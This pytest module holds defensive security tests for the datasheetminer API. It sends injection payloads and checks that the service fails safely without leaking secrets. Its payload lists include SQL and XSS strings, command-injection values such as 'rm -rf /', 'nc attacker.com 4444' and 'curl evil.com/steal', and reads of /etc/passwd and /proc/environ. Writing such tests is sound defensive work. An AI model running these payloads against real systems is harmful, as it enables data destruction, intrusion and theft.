"""
Security-focused integration tests for datasheetminer.

This module tests security aspects like input validation, injection attempts,
and potential security vulnerabilities in the API.
"""

import json
import pytest
import requests
from tests.integration.test_api_gateway import TestApiGateway


class TestSecurity(TestApiGateway):
    """Security tests for the API Gateway endpoint."""

    def test_sql_injection_attempt_in_prompt(self, api_gateway_url):
        """Test SQL injection attempts in prompt field."""
        headers = {"x-api-key": "test-key-for-injection"}

        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM sensitive_data --",
            "admin'--",
            "' OR 1=1#",
        ]

        for payload in sql_injection_payloads:
            data = {
                "prompt": f"Analyze this document: {payload}",
                "url": "https://httpbin.org/json",
            }

            response = requests.post(
                api_gateway_url, headers=headers, json=data, timeout=10
            )

            # Should not expose any database errors or succeed with injection
            assert response.status_code in [
                401,
                500,
            ]  # 401 for bad key, 500 for other errors
            if response.status_code == 500:
                response_json = response.json()
                # Ensure no database-related error messages
                error_text = str(response_json.get("error", "")).lower()
                assert "sql" not in error_text
                assert "database" not in error_text
                assert "table" not in error_text

    def test_xss_attempt_in_prompt(self, api_gateway_url):
        """Test XSS attempts in prompt field."""
        headers = {"x-api-key": "test-key-for-xss"}

        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "'><script>alert('xss')</script>",
        ]

        for payload in xss_payloads:
            data = {
                "prompt": f"Analyze this document: {payload}",
                "url": "https://httpbin.org/json",
            }

            response = requests.post(
                api_gateway_url, headers=headers, json=data, timeout=10
            )

            # Should handle XSS attempts safely
            assert response.status_code in [401, 500]
            if response.status_code == 500:
                response_json = response.json()
                # Response should not contain the XSS payload
                response_text = str(response_json)
                assert "<script>" not in response_text
                assert "javascript:" not in response_text
                assert "onerror=" not in response_text

    def test_command_injection_attempt_in_url(self, api_gateway_url):
        """Test command injection attempts in URL field."""
        headers = {"x-api-key": "test-key-for-command-injection"}

        command_injection_payloads = [
            "https://example.com/test.pdf; rm -rf /",
            "https://example.com/test.pdf && cat /etc/passwd",
            "https://example.com/test.pdf | nc attacker.com 4444",
            "https://example.com/test.pdf; curl evil.com/steal",
            "file:///etc/passwd",
        ]

        for payload in command_injection_payloads:
            data = {"prompt": "Test command injection", "url": payload}

            response = requests.post(
                api_gateway_url, headers=headers, json=data, timeout=10
            )

            # Should fail safely without executing commands
            assert response.status_code in [401, 500]
            if response.status_code == 500:
                response_json = response.json()
                error_text = str(response_json.get("error", "")).lower()
                # Should not contain signs of command execution
                assert "passwd" not in error_text
                assert "root:" not in error_text

    def test_path_traversal_attempt_in_url(self, api_gateway_url):
        """Test path traversal attempts in URL field."""
        headers = {"x-api-key": "test-key-for-path-traversal"}

        path_traversal_payloads = [
            "file:///../../../etc/passwd",
            "file:///etc/passwd",
            "https://example.com/../../../etc/passwd",
            "https://example.com/test.pdf?file=../../../etc/passwd",
            "ftp:///../../../etc/passwd",
        ]

        for payload in path_traversal_payloads:
            data = {"prompt": "Test path traversal", "url": payload}

            response = requests.post(
                api_gateway_url, headers=headers, json=data, timeout=10
            )

            # Should fail safely without accessing local files
            assert response.status_code in [401, 500]

    def test_oversized_payload_attack(self, api_gateway_url):
        """Test oversized payload handling."""
        headers = {"x-api-key": "test-key-for-oversized"}

        # Create oversized payloads
        large_prompt = "A" * (1024 * 1024)  # 1MB prompt
        large_url = "https://example.com/" + "B" * 10000 + ".pdf"

        test_cases = [
            {"prompt": large_prompt, "url": "https://example.com/test.pdf"},
            {"prompt": "Test", "url": large_url},
            {"prompt": large_prompt, "url": large_url},
        ]

        for data in test_cases:
            response = requests.post(
                api_gateway_url, headers=headers, json=data, timeout=15
            )

            # Should handle large payloads gracefully
            assert response.status_code in [
                400,
                401,
                413,
                500,
            ]  # 413 = Payload Too Large

    def test_malicious_headers_injection(self, api_gateway_url):
        """Test malicious header injection attempts."""
        base_headers = {"x-api-key": "test-key-for-headers"}

        malicious_headers = [
            {"x-forwarded-for": "127.0.0.1, evil.com"},
            {"host": "attacker.com"},
            {"user-agent": "<script>alert('xss')</script>"},
            {"referer": "javascript:alert('xss')"},
            {"x-real-ip": "'; DROP TABLE users; --"},
        ]

        data = {"prompt": "Test malicious headers", "url": "https://httpbin.org/json"}

        for malicious_header in malicious_headers:
            headers = {**base_headers, **malicious_header}

            response = requests.post(
                api_gateway_url, headers=headers, json=data, timeout=10
            )

            # Should handle malicious headers safely
            assert response.status_code in [401, 500]

    def test_json_payload_manipulation(self, api_gateway_url):
        """Test JSON payload manipulation attempts."""
        headers = {"x-api-key": "test-key-for-json-manipulation"}

        # Test various JSON manipulation attempts
        malicious_payloads = [
            # Prototype pollution attempt
            {
                "__proto__": {"admin": True},
                "prompt": "test",
                "url": "https://example.com/test.pdf",
            },
            # Constructor pollution
            {
                "constructor": {"prototype": {"admin": True}},
                "prompt": "test",
                "url": "https://example.com/test.pdf",
            },
            # Extra fields
            {
                "prompt": "test",
                "url": "https://example.com/test.pdf",
                "admin": True,
                "debug": True,
            },
            # Nested objects
            {"prompt": {"$ne": None}, "url": {"$regex": ".*"}},
            # Function attempts
            {
                "prompt": "test",
                "url": "https://example.com/test.pdf",
                "callback": "alert('xss')",
            },
        ]

        for payload in malicious_payloads:
            response = requests.post(
                api_gateway_url, headers=headers, json=payload, timeout=10
            )

            # Should handle malicious JSON safely
            assert response.status_code in [401, 500]

    def test_content_type_manipulation(self, api_gateway_url):
        """Test Content-Type header manipulation."""
        api_key = "test-key-for-content-type"

        # Test different content types
        test_cases = [
            {
                "Content-Type": "application/xml",
                "data": "<root><prompt>test</prompt></root>",
            },
            {
                "Content-Type": "text/plain",
                "data": "prompt=test&url=https://example.com/test.pdf",
            },
            {
                "Content-Type": "application/x-www-form-urlencoded",
                "data": "prompt=test&url=https://example.com/test.pdf",
            },
            {"Content-Type": "multipart/form-data", "data": "test data"},
            {"Content-Type": "application/octet-stream", "data": b"\x00\x01\x02\x03"},
        ]

        for test_case in test_cases:
            headers = {"x-api-key": api_key, "Content-Type": test_case["Content-Type"]}

            response = requests.post(
                api_gateway_url, headers=headers, data=test_case["data"], timeout=10
            )

            # Should handle different content types appropriately
            assert response.status_code in [
                400,
                401,
                415,
                500,
            ]  # 415 = Unsupported Media Type

    def test_api_key_extraction_attempts(self, api_gateway_url):
        """Test attempts to extract or manipulate API keys."""
        # Test with various malicious API key values
        malicious_keys = [
            "${API_KEY}",
            "{{API_KEY}}",
            "<%= API_KEY %>",
            "'; cat /proc/environ; echo '",
            "../../../etc/passwd",
            "javascript:alert(document.cookie)",
            "\x00\x01\x02\x03",  # Binary data
        ]

        data = {"prompt": "Test API key extraction", "url": "https://httpbin.org/json"}

        for malicious_key in malicious_keys:
            headers = {"x-api-key": malicious_key}

            response = requests.post(
                api_gateway_url, headers=headers, json=data, timeout=10
            )

            # Should reject malicious API keys
            assert response.status_code in [401, 500]

            # Response should not leak the malicious key
            response_text = response.text.lower()
            assert "api_key" not in response_text
            assert "gemini_api_key" not in response_text

    def test_rate_limiting_behavior(self, api_gateway_url):
        """Test rate limiting behavior (if implemented)."""
        headers = {"x-api-key": "test-key-for-rate-limiting"}
        data = {"prompt": "Rate limit test", "url": "https://httpbin.org/json"}

        # Make multiple rapid requests
        responses = []
        for i in range(10):
            try:
                response = requests.post(
                    api_gateway_url, headers=headers, json=data, timeout=5
                )
                responses.append(response.status_code)
            except requests.exceptions.Timeout:
                responses.append(408)  # Timeout

        # Should handle rapid requests gracefully
        for status_code in responses:
            assert status_code in [200, 401, 429, 500, 408]  # 429 = Too Many Requests

    def test_url_protocol_restrictions(self, api_gateway_url):
        """Test restrictions on URL protocols."""
        headers = {"x-api-key": "test-key-for-protocols"}

        # Test various protocols
        protocols = [
            "ftp://example.com/test.pdf",
            "file:///etc/passwd",
            "data:text/plain;base64,dGVzdA==",
            "ldap://example.com/test",
            "gopher://example.com/test",
            "ssh://example.com/test",
            "telnet://example.com/test",
        ]

        for url in protocols:
            data = {"prompt": "Test protocol restrictions", "url": url}

            response = requests.post(
                api_gateway_url, headers=headers, json=data, timeout=10
            )

            # Should restrict non-HTTP(S) protocols
            assert response.status_code in [401, 500]

    def test_response_information_disclosure(self, api_gateway_url):
        """Test for information disclosure in error responses."""
        headers = {"x-api-key": "test-key-for-disclosure"}

        # Trigger various error conditions
        error_conditions = [
            {"prompt": "", "url": ""},  # Empty values
            {"prompt": "test", "url": "invalid-url"},  # Invalid URL
            {
                "prompt": "test",
                "url": "https://nonexistent-domain-12345.com/test.pdf",
            },  # Non-existent domain
        ]

        for data in error_conditions:
            response = requests.post(
                api_gateway_url, headers=headers, json=data, timeout=10
            )

            if response.status_code == 500:
                response_json = response.json()
                error_message = str(response_json.get("error", "")).lower()

                # Should not disclose sensitive information
                sensitive_info = [
                    "aws_access_key",
                    "aws_secret",
                    "gemini_api_key",
                    "lambda_function_name",
                    "/var/task",
                    "/tmp",
                    "traceback",
                    "stack trace",
                    "internal server error details",
                ]

                for sensitive in sensitive_info:
                    assert sensitive not in error_message
